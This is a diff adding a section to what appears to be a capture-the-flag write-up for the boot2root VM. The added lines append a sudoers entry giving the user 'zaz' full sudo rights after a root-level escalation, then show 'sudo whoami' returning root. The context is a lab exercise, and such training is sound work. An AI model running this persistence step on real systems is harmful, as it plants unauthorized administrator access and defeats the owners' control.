@@ -178,6 +178,18 @@ uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 
 ```
 
+#### Now grant zaz with sudo
+
+```
+echo "zaz	ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+
+zaz@BornToSecHackMe:~$ sudo whoami
+root
+zaz@BornToSecHackMe:~$ sudo id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 We are now root
 
 ![shellcode](https://github.com/42aroger/boot2root/blob/master/img/rooted.png?raw=true)
